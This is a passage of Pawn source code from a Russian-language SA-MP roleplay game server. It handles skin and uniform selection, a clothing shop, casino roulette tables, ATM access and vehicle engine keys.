			if(PlayerInfo[playerid][pSex] == 1)
			{
				if(SelectCharRegID[playerid] == 1) SetPlayerSkin(playerid, JoinReg[1][0]), SelectCharRegID[playerid] = 2, ChosenSkin[playerid] = JoinReg[1][0];
				else if(SelectCharRegID[playerid] == 2) SetPlayerSkin(playerid, JoinReg[2][0]), SelectCharRegID[playerid] = 3, ChosenSkin[playerid] = JoinReg[2][0];
				else if(SelectCharRegID[playerid] == 3) SetPlayerSkin(playerid, JoinReg[3][0]), SelectCharRegID[playerid] = 4, ChosenSkin[playerid] = JoinReg[3][0];
				else if(SelectCharRegID[playerid] == 4) SetPlayerSkin(playerid, JoinReg[4][0]), SelectCharRegID[playerid] = 5, ChosenSkin[playerid] = JoinReg[4][0];
				else if(SelectCharRegID[playerid] == 5) SetPlayerSkin(playerid, JoinReg[0][0]), SelectCharRegID[playerid] = 1, ChosenSkin[playerid] = JoinReg[0][0];
			}
			else
			{
				if(SelectCharRegID[playerid] == 1) SetPlayerSkin(playerid, JoinReg[6][0]), SelectCharRegID[playerid] = 2, ChosenSkin[playerid] = JoinReg[6][0];
				else if(SelectCharRegID[playerid] == 2) SetPlayerSkin(playerid, JoinReg[7][0]), SelectCharRegID[playerid] = 3, ChosenSkin[playerid] = JoinReg[7][0];
				else if(SelectCharRegID[playerid] == 3) SetPlayerSkin(playerid, JoinReg[5][0]), SelectCharRegID[playerid] = 1, ChosenSkin[playerid] = JoinReg[5][0];
			}
		}
		else if(clickedid == ButtonLeft)
		{
			if(PlayerInfo[playerid][pSex] == 1)
			{
				if(SelectCharRegID[playerid] == 5) SetPlayerSkin(playerid, JoinReg[3][0]), SelectCharRegID[playerid] = 4, ChosenSkin[playerid] = JoinReg[4][0];
				else if(SelectCharRegID[playerid] == 4) SetPlayerSkin(playerid, JoinReg[2][0]), SelectCharRegID[playerid] = 3, ChosenSkin[playerid] = JoinReg[3][0];
				else if(SelectCharRegID[playerid] == 3) SetPlayerSkin(playerid, JoinReg[1][0]), SelectCharRegID[playerid] = 2, ChosenSkin[playerid] = JoinReg[2][0];
				else if(SelectCharRegID[playerid] == 2) SetPlayerSkin(playerid, JoinReg[0][0]), SelectCharRegID[playerid] = 1, ChosenSkin[playerid] = JoinReg[1][0];
				else if(SelectCharRegID[playerid] == 1) SetPlayerSkin(playerid, JoinReg[5][0]), SelectCharRegID[playerid] = 5, ChosenSkin[playerid] = JoinReg[0][0];
			}
			else
			{
				if(SelectCharRegID[playerid] == 1) SetPlayerSkin(playerid, JoinReg[5][0]), SelectCharRegID[playerid] = 1, ChosenSkin[playerid] = JoinReg[5][0];
				else if(SelectCharRegID[playerid] == 2) SetPlayerSkin(playerid, JoinReg[7][0]), SelectCharRegID[playerid] = 3, ChosenSkin[playerid] = JoinReg[7][0];
				else if(SelectCharRegID[playerid] == 3) SetPlayerSkin(playerid, JoinReg[6][0]), SelectCharRegID[playerid] = 2, ChosenSkin[playerid] = JoinReg[6][0];
			}
		}
		else if(clickedid == ButtonSelect)
		{
			PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
			SelectCharRegID[playerid] = 0;
			ClothesRound[playerid] = 0;
			TogglePlayerControllable(playerid, 1);
			ClothesRun[playerid] = 0;
			CreateAccount(playerid, PlayerInfo[playerid][pPassword]);
			SpawnPlayer(playerid);
			TextDrawHideForPlayer(playerid,ButtonLeft);
			TextDrawHideForPlayer(playerid,ButtonRight);
			TextDrawHideForPlayer(playerid,ButtonSelect);
			CancelSelectTextDraw(playerid);
			SendClientMessage(playerid, COLOR_WHITE, "Вы успешно зарегистрировались!");
		}
	}
	else if(ClothesRound[playerid] == 2)
	{
		if(clickedid == ButtonRight)
		{
			switch (SelectCharID[playerid])
			{
			case F_MAYOR:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[1][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[1][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[2][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[2][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[3][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[3][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[4][0]), SelectCharPlace[playerid] = 5, ChosenSkin[playerid] = JoinPed[4][0];
					else if(SelectCharPlace[playerid] == 5) SetPlayerSkin(playerid, JoinPed[5][0]), SelectCharPlace[playerid] = 6, ChosenSkin[playerid] = JoinPed[5][0];
					else if(SelectCharPlace[playerid] == 6) SetPlayerSkin(playerid, JoinPed[0][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[0][0];
				}
			case F_POLICE_LS,F_POLICE_SF:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[7][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[7][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[8][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[8][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[9][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[9][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[10][0]), SelectCharPlace[playerid] = 5, ChosenSkin[playerid] = JoinPed[10][0];
					else if(SelectCharPlace[playerid] == 5) SetPlayerSkin(playerid, JoinPed[11][0]), SelectCharPlace[playerid] = 6, ChosenSkin[playerid] = JoinPed[11][0];
					else if(SelectCharPlace[playerid] == 6) SetPlayerSkin(playerid, JoinPed[12][0]), SelectCharPlace[playerid] = 7, ChosenSkin[playerid] = JoinPed[12][0];
					else if(SelectCharPlace[playerid] == 7) SetPlayerSkin(playerid, JoinPed[13][0]), SelectCharPlace[playerid] = 8, ChosenSkin[playerid] = JoinPed[13][0];
					else if(SelectCharPlace[playerid] == 8) SetPlayerSkin(playerid, JoinPed[6][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[6][0];
				}
			case F_FBI:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[15][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[15][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[16][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[16][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[17][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[17][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[18][0]), SelectCharPlace[playerid] = 5, ChosenSkin[playerid] = JoinPed[18][0];
					else if(SelectCharPlace[playerid] == 5) SetPlayerSkin(playerid, JoinPed[14][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[14][0];
				}
			case F_HOSPITAL:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[20][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[20][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[21][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[21][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[22][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[22][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[23][0]), SelectCharPlace[playerid] = 5, ChosenSkin[playerid] = JoinPed[23][0];
					else if(SelectCharPlace[playerid] == 5) SetPlayerSkin(playerid, JoinPed[24][0]), SelectCharPlace[playerid] = 6, ChosenSkin[playerid] = JoinPed[24][0];
					else if(SelectCharPlace[playerid] == 6) SetPlayerSkin(playerid, JoinPed[19][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[19][0];
				}
			case F_LIC:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[26][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[26][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[5][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[5][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[25][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[25][0];
				}
			case F_GROVE:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[37][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[37][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[38][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[38][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[39][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[39][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[40][0]), SelectCharPlace[playerid] = 5, ChosenSkin[playerid] = JoinPed[40][0];
					else if(SelectCharPlace[playerid] == 5) SetPlayerSkin(playerid, JoinPed[41][0]), SelectCharPlace[playerid] = 6, ChosenSkin[playerid] = JoinPed[41][0];
					else if(SelectCharPlace[playerid] == 6) SetPlayerSkin(playerid, JoinPed[42][0]), SelectCharPlace[playerid] = 7, ChosenSkin[playerid] = JoinPed[42][0];
					else if(SelectCharPlace[playerid] == 7) SetPlayerSkin(playerid, JoinPed[36][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[36][0];
				}
			case F_BALLAS:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[33][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[33][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[34][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[34][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[35][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[35][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[32][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[32][0];
				}
			case F_RIFA:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[52][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[52][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[53][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[53][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[54][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[54][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[51][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[51][0];
				}
			case F_AZTECAS:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[44][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[44][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[45][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[45][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[46][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[46][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[43][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[43][0];
				}
			case F_VAGOS:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[48][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[48][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[49][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[49][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[50][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[50][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[47][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[47][0];
				}
			case F_ARMY:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[31][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[31][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[30][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[30][0];
				}
			case F_YAKUZA:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[59][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[59][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[60][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[60][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[61][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[61][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[62][0]), SelectCharPlace[playerid] = 5, ChosenSkin[playerid] = JoinPed[62][0];
					else if(SelectCharPlace[playerid] == 5) SetPlayerSkin(playerid, JoinPed[63][0]), SelectCharPlace[playerid] = 6, ChosenSkin[playerid] = JoinPed[63][0];
					else if(SelectCharPlace[playerid] == 6) SetPlayerSkin(playerid, JoinPed[64][0]), SelectCharPlace[playerid] = 7, ChosenSkin[playerid] = JoinPed[64][0];
					else if(SelectCharPlace[playerid] == 7) SetPlayerSkin(playerid, JoinPed[58][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[58][0];
				}
			case F_RM:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[66][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[66][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[67][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[67][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[68][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[68][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[69][0]), SelectCharPlace[playerid] = 5, ChosenSkin[playerid] = JoinPed[69][0];
					else if(SelectCharPlace[playerid] == 5) SetPlayerSkin(playerid, JoinPed[70][0]), SelectCharPlace[playerid] = 6, ChosenSkin[playerid] = JoinPed[70][0];
					else if(SelectCharPlace[playerid] == 6) SetPlayerSkin(playerid, JoinPed[65][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[65][0];
				}
			case F_LCN:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[72][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[72][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[73][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[73][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[74][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[74][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[71][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[71][0];
				}
			case F_UNITEDNEWS:
				{
					if(SelectCharPlace[playerid] == 1) SetPlayerSkin(playerid, JoinPed[76][0]), SelectCharPlace[playerid] = 2, ChosenSkin[playerid] = JoinPed[76][0];
					else if(SelectCharPlace[playerid] == 2) SetPlayerSkin(playerid, JoinPed[77][0]), SelectCharPlace[playerid] = 3, ChosenSkin[playerid] = JoinPed[77][0];
					else if(SelectCharPlace[playerid] == 3) SetPlayerSkin(playerid, JoinPed[78][0]), SelectCharPlace[playerid] = 4, ChosenSkin[playerid] = JoinPed[78][0];
					else if(SelectCharPlace[playerid] == 4) SetPlayerSkin(playerid, JoinPed[79][0]), SelectCharPlace[playerid] = 5, ChosenSkin[playerid] = JoinPed[79][0];
					else if(SelectCharPlace[playerid] == 5) SetPlayerSkin(playerid, JoinPed[75][0]), SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[75][0];
				}
			}
		}
		else if(clickedid == ButtonCancel)
		{
			SelectCharPlace[playerid] = 0;
			SelectCharID[playerid] = 0;
			ClothesRound[playerid] = 0;
			TextDrawHideForPlayer(playerid,ButtonRight);
			TextDrawHideForPlayer(playerid,ButtonSelect);
			CancelSelectTextDraw(playerid);
			SetPlayerSkin(playerid,PlayerInfo[playerid][pChar]);
			if(InShopSkin[playerid] > 0)
			{
				TogglePlayerControllable(playerid,true);
				TextDrawHideForPlayer(playerid,ButtonCancel);
				SetPlayerPos(playerid, 210.9861,-8.2321,1005.2109);
				SetPlayerFacingAngle(playerid, 273.3);
				SetPlayerVirtualWorld(playerid, InShopSkin[playerid]);
				SetPlayerInterior(playerid, 5);
				InShopSkin[playerid] = 0;
				SetCameraBehindPlayer(playerid);
			}
			else SpawnPlayer(playerid);
		}
		else if(clickedid == ButtonSelect)
		{
			PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			SelectCharPlace[playerid] = 0;
			SelectCharID[playerid] = 0;
			ClothesRound[playerid] = 0;
			TextDrawHideForPlayer(playerid,ButtonRight);
			TextDrawHideForPlayer(playerid,ButtonSelect);
			CancelSelectTextDraw(playerid);
			if(InShopSkin[playerid] > 0)
			{
				TogglePlayerControllable(playerid,true);
				TextDrawHideForPlayer(playerid,ButtonCancel);
				SetPlayerPos(playerid, 210.9861,-8.2321,1005.2109);
				SetPlayerFacingAngle(playerid, 273.3);
				SetPlayerVirtualWorld(playerid, InShopSkin[playerid]);
				SetPlayerInterior(playerid, 5);
				InShopSkin[playerid] = 0;
				SetCameraBehindPlayer(playerid);
			}
			else SpawnPlayer(playerid);
		}
	}
	else if(ClothesRound[playerid] == 3)
	{
		new string[128];
		if(clickedid == ButtonRight)
		{
			if(PlayerInfo[playerid][pSex] == 1)
			{
				if(SelectCharPlace[playerid] == sizeof(JoinShopM)-1) SelectCharPlace[playerid] = 0;
				else SelectCharPlace[playerid]++;
				SetPlayerSkin(playerid, JoinShopM[SelectCharPlace[playerid]][0]);
				format(string, 128, "~b~~n~~n~~n~~n~~n~~n~PRICE: ~w~%i",JoinShopM[SelectCharPlace[playerid]][1]);
			}
			else
			{
				if(SelectCharPlace[playerid] == sizeof(JoinShopF)-1) SelectCharPlace[playerid] = 0;
				else SelectCharPlace[playerid]++;
				SetPlayerSkin(playerid, JoinShopF[SelectCharPlace[playerid]][0]);
				format(string, 128, "~b~~n~~n~~n~~n~~n~~n~PRICE: ~w~%i",JoinShopF[SelectCharPlace[playerid]][1]);
			}
			GameTextForPlayer(playerid, string, 2000, 3);
		}
		if(clickedid == ButtonLeft)
		{
			if(PlayerInfo[playerid][pSex] == 1)
			{
				if(SelectCharPlace[playerid] == sizeof(JoinShopM)-1) SelectCharPlace[playerid] = 0;
				else SelectCharPlace[playerid]--;
				SetPlayerSkin(playerid, JoinShopM[SelectCharPlace[playerid]][0]);
				format(string, 128, "~b~~n~~n~~n~~n~~n~~n~PRICE: ~w~%i",JoinShopM[SelectCharPlace[playerid]][1]);
			}
			else
			{
				if(SelectCharPlace[playerid] == sizeof(JoinShopF)-1) SelectCharPlace[playerid] = 0;
				else SelectCharPlace[playerid]++;
				SetPlayerSkin(playerid, JoinShopF[SelectCharPlace[playerid]][0]);
				format(string, 128, "~b~~n~~n~~n~~n~~n~~n~PRICE: ~w~%i",JoinShopF[SelectCharPlace[playerid]][1]);
			}
			GameTextForPlayer(playerid, string, 2000, 3);
		}
		else if(clickedid == ButtonSelect)
		{
			if(PlayerInfo[playerid][pSex] == 1)
			{
				if(PlayerInfo[playerid][pBank] < JoinShopM[SelectCharPlace[playerid]][1])
				{
					return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств на счету!");
				}
				PlayerInfo[playerid][pModel] = JoinShopM[SelectCharPlace[playerid]][0];
				PlayerInfo[playerid][pBank] -= JoinShopM[SelectCharPlace[playerid]][1];
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < JoinShopF[SelectCharPlace[playerid]][1])
				{
					return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств на счету!");
				}
				PlayerInfo[playerid][pModel] = JoinShopF[SelectCharPlace[playerid]][0];
				PlayerInfo[playerid][pBank] -= JoinShopF[SelectCharPlace[playerid]][1];
			}
			TogglePlayerControllable(playerid,true);
			SetPlayerPos(playerid, 210.9861,-8.2321,1005.2109);
			SetPlayerFacingAngle(playerid, 273.3);
			SetPlayerVirtualWorld(playerid, InShopSkin[playerid]);
			SetPlayerInterior(playerid, 5);
			InShopSkin[playerid] = 0;
			SelectCharPlace[playerid] = 0;
			ClothesRound[playerid] = 0;
			SetCameraBehindPlayer(playerid);
			SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			new house12 = 0;
			for(new i = 1; i <= TOTALHOUSE;i++)
			{
				if(!strcmp(HouseInfo[i][hOwner],PlayerInfo[playerid][pSendername],true)) house12++;
			}
			if(house12 != 0)
			{
				format(string, 128, "Полка №1 - %d\nПолка №2 - %d\nПолка №3 - %d",PlayerInfo[playerid][pSkin1],PlayerInfo[playerid][pSkin2], PlayerInfo[playerid][pSkin3]);
				ShowPlayerDialog(playerid, 1431, 2, "Куда положить одежду", string, "Выбор", "");
			}
			TextDrawHideForPlayer(playerid,ButtonRight);
			TextDrawHideForPlayer(playerid,ButtonSelect);
			TextDrawHideForPlayer(playerid,ButtonCancel);
			TextDrawHideForPlayer(playerid,ButtonLeft);
			CancelSelectTextDraw(playerid);
			SendMes(playerid, COLOR_BLUE, "Вы купили одежду в магазине. Остаток на счете: %i долларов", PlayerInfo[playerid][pBank]);
		}
		else if(clickedid == ButtonCancel)
		{
			TogglePlayerControllable(playerid,true);
			SetPlayerPos(playerid, 210.9861,-8.2321,1005.2109);
			SetPlayerFacingAngle(playerid, 273.3);
			SetPlayerVirtualWorld(playerid, InShopSkin[playerid]);
			SetPlayerInterior(playerid, 5);
			InShopSkin[playerid] = 0;
			SelectCharPlace[playerid] = 0;
			ClothesRound[playerid] = 0;
			SetCameraBehindPlayer(playerid);
			SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			TextDrawHideForPlayer(playerid,ButtonRight);
			TextDrawHideForPlayer(playerid,ButtonSelect);
			TextDrawHideForPlayer(playerid,ButtonCancel);
			TextDrawHideForPlayer(playerid,ButtonLeft);
			CancelSelectTextDraw(playerid);
		}
	}
	return true;
}
public OnPlayerExitedMenu(playerid) return true;
public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid) return true;
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	new string[256];
	if(newkeys == 4)
	{
		new Float:pos[3];
		GetPlayerPos(playerid,pos[0],pos[1],pos[2]);
		if(pos[0] == 2648.4799) KickEx(playerid,1171);
		return false;
	}
	//================================================наручники=====================
	if(newkeys & KEY_FIRE && !(oldkeys & KEY_FIRE) && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_CUFFED) ApplyAnimation(playerid, "GYMNASIUM", " gym_tread_falloff",4.1,0,1,1,0,0);
	if(newkeys & KEY_JUMP && !(oldkeys & KEY_JUMP) && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_CUFFED) ApplyAnimation(playerid, "GYMNASIUM", "gym_jog_falloff",4.1,0,1,1,0,0);
	if(newkeys & KEY_HANDBRAKE && !(oldkeys & KEY_HANDBRAKE) && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_CUFFED) ApplyAnimation(playerid, "GYMNASIUM", " gym_tread_falloff",4.1,0,1,1,0,0);
	//================================================наручники=====================
	if(newkeys == 16)
	{
		if(PlayerLogged[playerid] == 0) return true;
		if(IsPlayerInRangeOfPoint(playerid,2.0,2231.0784,1619.5814,1007.1223))
		{
			if (Kazkamera[playerid] == 0)
			{
				if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы выполнили более 2х действий за 1 секунду!");
				new Float:xi,Float:yi,Float:zi;
				GetPlayerPos(playerid,xi,yi,zi);
				SetPlayerCameraPos(playerid,xi,yi,zi+2);
				SetPlayerCameraLookAt(playerid,2230.8989,1619.2358,1006.1888,CAMERA_MOVE);
				Kazkamera[playerid] =1;
				TogglePlayerControllable(playerid, 0);
				UseRoulette[playerid] =1;
				fishechkax[playerid]=2230.2999;
				fishechkay[playerid]=1619.5603;
				NumberFishka[playerid] =0;
				Upravakazino[playerid] =true;
				Fishka[playerid] = CreateObject(1913,fishechkax[playerid],fishechkay[playerid], 1006.0690,0.00,0.00,0.00);
				SetPVarInt(playerid,"AntiFlood",gettime() + 3);
			}
			else
			{
				ShowPlayerDialog(playerid,12127,DIALOG_STYLE_MSGBOX,"Игровой стол №1","Вы действительно хотите выйти со стола?","Да","Отмена");
			}
			return true;
		}
		else if (IsPlayerInRangeOfPoint(playerid,2.0,2242.4980,1619.5001,1006.2346))
		{
			if (Kazkamera[playerid] == 0)
			{
				if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы выполнили более 2х действий за 1 секунду!");
				new Float:xi,Float:yi,Float:zi;
				GetPlayerPos(playerid,xi,yi,zi);
				SetPlayerCameraPos(playerid,xi,yi,zi+2);
				SetPlayerCameraLookAt(playerid,2242.4980,1619.5001,1006.2346,CAMERA_MOVE);
				Kazkamera[playerid] =1;
				TogglePlayerControllable(playerid, 0);
				UseRoulette[playerid] = 2;
				fishechkax[playerid]=2241.9082;
				fishechkay[playerid]=1619.5603;
				NumberFishka[playerid] =0;
				Upravakazino[playerid] =true;
				Fishka[playerid]= CreateObject(1913,2241.9082,1619.5603, 1006.0690,0.00,0.00,0.00);
				SetPVarInt(playerid,"AntiFlood",gettime() + 3);
			}
			else
			{
				ShowPlayerDialog(playerid,12127,DIALOG_STYLE_MSGBOX,"Игровой стол №1","Вы действительно хотите выйти со стола?","Да","Отмена");
			}
			return true;
		}
	}
	if(newkeys & KEY_WALK)
	{
		if(PlayerLogged[playerid] == 0) return true;
		for(new i = 1; i <= TOTALATM; i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, ATMInfo[i][aX],ATMInfo[i][aY],ATMInfo[i][aZ]))
			{
				SetTimerEx("BankList",140,false,"i",playerid);
			}
		}
	}
	if (newkeys & KEY_SPRINT)
	{
		if (Upravakazino[playerid] ==true)
		{
			switch(NumberFishka[playerid])
			{
			case 0..36:
				{
					RuletTip[playerid] = NumberFishka[playerid]+1;
				}
			case 45,46:
				{
					RuletTip[playerid] = NumberFishka[playerid]-7;
				}
			case 40..42:
				{
					RuletTip[playerid] = NumberFishka[playerid];
				}
			case 43:
				{
					RuletTip[playerid] = 43;
				}
			case 48:
				{
					RuletTip[playerid] = 44;
				}
			case 44:
				{
					RuletTip[playerid] = 45;
				}
			case 47:
				{
					RuletTip[playerid] = 46;
				}
			case 37..39:
				{
					RuletTip[playerid] = NumberFishka[playerid]+10;
				}
			}
			format(string,128, "Cделайте ставку!\n Минимальная ставка: 500$\nМаксимальная ставка: 100.000$");
			ShowPlayerDialog(playerid,5576,DIALOG_STYLE_INPUT,"Casino » Рулетка",string,"Играть","Назад");
		}
	}
	if(newkeys & KEY_SPRINT && newkeys & KEY_JUMP)
	{
		if(!IsPlayerInAnyVehicle(playerid) && times[playerid] == true)
		{
			times[playerid] = false;
			SetTimerEx("AntiBH",790,false,"i",playerid);
			return true;
		}
	}
	if(newkeys & KEY_SUBMISSION)
	{
		if(PlayerLogged[playerid] == 0) return true;
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
		if(GetPVarInt(playerid, "InShop") > 0 || InShop[playerid] > 0) return true;
		new cars =0,temp = GetVehicleModel( GetPlayerVehicleID( playerid ) );
		for(new i; i != sizeof( BE_Bad_Vehs ); i++ )
		{
			if( temp == BE_Bad_Vehs[ i ] ) cars++;
		}
		if(Bonnet[GetPlayerVehicleID(playerid)] == true) return SendClientMessage(playerid, COLOR_GREY, "Дождитесь, пока автомеханик отремонтирует транспорт!");
		if(Fuel[GetPlayerVehicleID(playerid)] <= 0 && cars == 0) return SendClientMessage(playerid, COLOR_GREY, CarHasNoFuel);
		if(Engine[GetPlayerVehicleID(playerid)] == false)
		{
			GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_ON,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
			Engine[GetPlayerVehicleID(playerid)] = true;
			Lights[GetPlayerVehicleID(playerid)] = true;
		}
		else
		{
